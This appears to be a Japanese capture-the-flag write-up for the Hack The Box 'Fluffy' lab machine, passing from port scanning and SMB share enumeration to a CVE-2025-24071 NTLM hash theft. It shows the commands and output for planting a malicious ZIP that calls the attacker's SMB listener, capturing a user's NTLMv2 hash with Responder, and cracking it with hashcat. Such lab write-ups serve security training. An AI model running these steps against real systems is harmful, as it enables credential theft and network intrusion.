https://app.hackthebox.com/machines/662

## STEP 1
```sh
─$ rustscan -a 10.129.180.164 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.180.164:53
Open 10.129.180.164:88
Open 10.129.180.164:139
Open 10.129.180.164:389
Open 10.129.180.164:445
Open 10.129.180.164:464
Open 10.129.180.164:593
Open 10.129.180.164:636
Open 10.129.180.164:3269
Open 10.129.180.164:3268
Open 10.129.180.164:5985
Open 10.129.180.164:9389
Open 10.129.180.164:49667
Open 10.129.180.164:49689
Open 10.129.180.164:49690
Open 10.129.180.164:49698
Open 10.129.180.164:49709
Open 10.129.180.164:49722
10.129.180.164 -> [53,88,139,389,445,464,593,636,3269,3268,5985,9389,49667,49689,49690,49698,49709,49722]
```


## STEP 2
判明しているクレデンシャルでsmb列挙  
itフォルダがreadおよびwrite権限あり
```sh
└─$ netexec smb 10.129.180.164 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.129.180.164  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.180.164  445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.180.164  445    DC01             [*] Enumerated shares
SMB         10.129.180.164  445    DC01             Share           Permissions     Remark
SMB         10.129.180.164  445    DC01             -----           -----------     ------
SMB         10.129.180.164  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.180.164  445    DC01             C$                              Default share
SMB         10.129.180.164  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.180.164  445    DC01             IT              READ,WRITE      
SMB         10.129.180.164  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.180.164  445    DC01             SYSVOL          READ            Logon server share
```
itフォルダ内にpdf発見・ダウンロード
```sh
└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.180.164/IT  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Oct 26 11:47:26 2025
  ..                                  D        0  Sun Oct 26 11:47:26 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

                5842943 blocks of size 4096. 1589754 blocks available

smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (86.7 KiloBytes/sec) (average 86.7 KiloBytes/sec)
```
pdfはセキュリティアップデートに関する内容であったが、この中で一つ面白い脆弱性を発見  
2025-24071はzipファイルを解凍後、展開されたlibrary-msファイル内のsmbパスに接続・認証を求める動作が発生する  
詳細は[こちら](https://iototsecnews.jp/2025/05/29/windows-11-file-explorer-vulnerability-enables-ntlm-hash-theft/)  
ということで、smbパスに攻撃者のresponderを指定すればあるユーザのntハッシュを取得できるかも  
運がいいことにitフォルダに対するwrite権限があったので、その中に脆弱性を悪用するzipを投下する
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_01.png">  
exploitdbにPoCがあったのでダウンロード
```sh
└─$ searchsploit -m 52310                                                  
  Exploit: Windows File Explorer Windows 11 (23H2) - NTLM Hash Disclosure
      URL: https://www.exploit-db.com/exploits/52310
     Path: /usr/share/exploitdb/exploits/windows/remote/52310.py
    Codes: CVE-2025-24071
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/52310.py
```
PoC実行、zipファイル作成・転送
```sh
└─$ python3.13 52310.py -i 10.10.16.28   
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/malicious.zip
[-] Removed intermediate .library-ms file
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.

└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' -c 'put output/malicious.zip malicious.zip' //10.129.180.164/IT 
putting file output/malicious.zip as \malicious.zip (0.4 kb/s) (average 0.4 kb/s)
```
数十秒後、p.agilaのntlmv2を取得
```sh
└─$ sudo responder -I tun0 -v                  
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.28]
    Responder IPv6             [dead:beef:4::101a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-FU999S0IJM8]
    Responder Domain Name      [7NWM.LOCAL]
    Responder DCE-RPC Port     [46928]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.129.180.164
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:21ff35a920c2d5e2:D2040ADA5724EE166D8A14D051BB1390:010100000000000000A1C8F97746DC01EF96C7639761DF09000000000200080037004E0057004D0001001E00570049004E002D00460055003900390039005300300049004A004D00380004003400570049004E002D00460055003900390039005300300049004A004D0038002E0037004E0057004D002E004C004F00430041004C000300140037004E0057004D002E004C004F00430041004C000500140037004E0057004D002E004C004F00430041004C000700080000A1C8F97746DC01060004000200000008003000300000000000000001000000002000008298BC357424DFB2237001C7CBC36699C60D28F91D8CABE3BE4E947B672AF38D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320038000000000000000000
```
ntlmv2をクラック成功  
p.agilaのパスワードは、prometheusx-303
```sh
└─$ name-that-hash -f p.agila.txt --no-banner 

p.agila::FLUFFY:21ff35a920c2d5e2:D2040ADA5724EE166D8A14D051BB1390:010100000000000000A1C8F97746DC01EF96C7639761DF09000000000200080037004E0057004D0001001E00570049004E002
D00460055003900390039005300300049004A004D00380004003400570049004E002D00460055003900390039005300300049004A004D0038002E0037004E0057004D002E004C004F00430041004C0003001400
37004E0057004D002E004C004F00430041004C000500140037004E0057004D002E004C004F00430041004C000700080000A1C8F97746DC010600040002000000080030003000000000000000010000000020000
08298BC357424DFB2237001C7CBC36699C60D28F91D8CABE3BE4E947B672AF38D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E
00320038000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

└─$ hashcat -a 0 -m 5600 p.agila.txt /usr/share/wordlists/rockyou.txt --quiet 
P.AGILA::FLUFFY:21ff35a920c2d5e2:d2040ada5724ee166d8a14d051bb1390:010100000000000000a1c8f97746dc01ef96c7639761df09000000000200080037004e0057004d0001001e00570049004e002d00460055003900390039005300300049004a004d00380004003400570049004e002d00460055003900390039005300300049004a004d0038002e0037004e0057004d002e004c004f00430041004c000300140037004e0057004d002e004c004f00430041004c000500140037004e0057004d002e004c004f00430041004c000700080000a1c8f97746dc01060004000200000008003000300000000000000001000000002000008298bc357424dfb2237001c7cbc36699c60d28f91d8cabe3be4e947b672af38d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320038000000000000000000:prometheusx-303
```
